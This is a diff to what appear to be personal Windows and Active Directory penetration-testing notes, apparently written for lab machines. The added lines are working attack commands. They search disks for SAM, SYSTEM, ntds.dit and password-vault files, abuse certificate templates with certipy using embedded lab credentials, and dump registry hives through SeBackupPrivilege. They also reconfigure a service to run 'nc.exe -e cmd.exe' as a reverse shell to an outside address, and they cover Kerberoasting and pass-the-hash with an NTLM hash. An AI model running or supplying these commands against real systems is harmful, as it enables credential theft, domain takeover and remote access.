@@ -52,7 +52,7 @@ There are several key pieces of information we should always obtain:
 # Get the path of the process
 # Sensitive information may be stored in meeting notes, configuration files, or onboarding documents. With the information we gathered in the situational awareness process, we can make educated guesses on where to find such files.
 > Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
-> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*kdbx,SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
+> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*kdbx,*.git,SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
 > Get-ChildItem -Path C:\ -Include SYSTEM,SAM,SECURITY,ntds.dit -File -Recurse -ErrorAction SilentlyContinue
 # If you get access to the machine through another user, then restart the file search, as permissions may have changed
 > Get-ChildItem -Path C:\ -Filter ".git" -Recurse -Force -ErrorAction SilentlyContinue # to discover .git or any folder in c:\
@@ -1233,6 +1233,8 @@ Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:172.16.173.7"
 
 #### Pass the Hash
 
+Bunch of examples, "https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/".
+
 If you can't crack the NTLM hash, you can always pass it. This resource walks you through it, 'https://dmcxblue.gitbook.io/red-team-notes/lateral-movement/pass-the-hash'. 
 
 #### Other Resources
@@ -1542,14 +1544,20 @@ If LDAP is open, you can try to connect to LDAP through your browser, 'https:10.
 You can also see it when you run winpeas towards the end in the certificate section. 
 
 ```bash
-certipy req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication
+# This'll give you some information to put into BloodHound
+certipy-ad find -u hazel.green -p haze1988 -dc-ip 192.168.165.40
+# Vulnerable ?
+certipy-ad find -u hazel.green -p haze1988 -dc-ip 192.168.165.40 -stdout -vulnerable
+# Molly is basically head Domain Admin. Seems like the quotes made a difference
+certipy-ad req -u hazel.green -p haze1988 -target dc.hokkaido-aerospace.com -upn 'molly.smith@hokkaido-aerospace.com' -ca 'hokkaido-aerospace-DC-CA'
+certipy req -u hazel.green -p haze1988 -target hokkaido-aerospace.com -upn administrator@hokkaido-aerospace.com -ca hokkaido-aerospace-DC-CA  --template UserAuthentication
 ```
 
 ```bash
 # Taken from Certify's Github Page
 .\Certify.exe find /vulnerable
 .\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:adminstrator /outfile:C:\Windows\Tasks\cert.pem
-
+certipy-ad req -u hazel.green -p haze1988 -target-ip dc.hokkaido-aerospace.com -upn Hazel.Green@hokkaido-aerospace.com -ca hokkaido-aerospace-DC-CA -template
 # Paste the RSA PRIVATE KEY in cert.pem file
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
@@ -1623,6 +1631,30 @@ lsadump::dcsync /domain:htb.local /user:Administrator
 secretsdump.py htb.local/hacker:Hacker123\!@$ip
 ```
 
+#### SeBackupPrivilege
+
+```bash
+cd c:\
+mkdir Temp
+reg save hklm\sam c:\Temp\sam
+reg save hklm\system c:\Temp\system
+cd Temp
+download sam
+download system
+```
+
+#### Exploiting Service Operators Group Membership
+
+```bash
+services # look for True
+upload nc.exe
+sc.exe config VMTools binPath="C:\Users\aarti\Documents\nc.exe -e cmd.exe 192.168.1.205 1234"
+nc -lvnp 1234
+```
+
+#### ForceChangePassword
+
+
 #### Read LAPS
 
 ```bash
@@ -1654,8 +1686,8 @@ GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip $ip 'DOMAIN/
 Kerberoasting:
 
 ```bash
-impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip 'DOMAIN/'
-impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip example.com/user:password
+impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip '$dom/'
+impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip $dom/user:password
 ```
 
 Dump hashes for users, needs admin or sam/security/system files:
@@ -1683,4 +1715,19 @@ Whenever you're pentesting a windows network or computer, just fucking take the 
 
 ```bash
 sudo ntpdate $ip
+```
+
+####  Logins not Working with Password? Try with TGT!
+
+Go to https://codebeautify.org.
+
+```bash
+getTGT.py $dom/john -dc-ip $ip -hashes :6DFCB20C87D04F9A4F9605F2413395D4
+```
+
+#### Targeted Kerberoasting ??
+
+```bash
+source /opt/windows/targetedKerberoast/venv/bin/activate
+python /opt/windows/targetedKerberoast/targetedKerberoast.py -d $dom -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip $ip
 ```
